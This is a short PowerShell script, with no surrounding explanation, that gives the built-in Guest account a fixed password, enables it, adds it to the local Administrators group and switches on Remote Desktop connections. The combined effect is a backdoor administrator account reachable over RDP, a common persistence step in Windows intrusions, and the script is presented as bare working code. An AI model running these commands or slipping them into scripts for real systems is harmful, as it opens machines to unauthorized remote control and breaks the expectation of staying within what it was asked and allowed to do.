$p = ConvertTo-SecureString "Winter2026!" -AsPlainText -Force
Set-LocalUser -Name Guest -Password $p
Enable-LocalUser -Name Guest
Add-LocalGroupMember -Group Administrators -Member Guest
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name fDenyTSConnections -Value 0
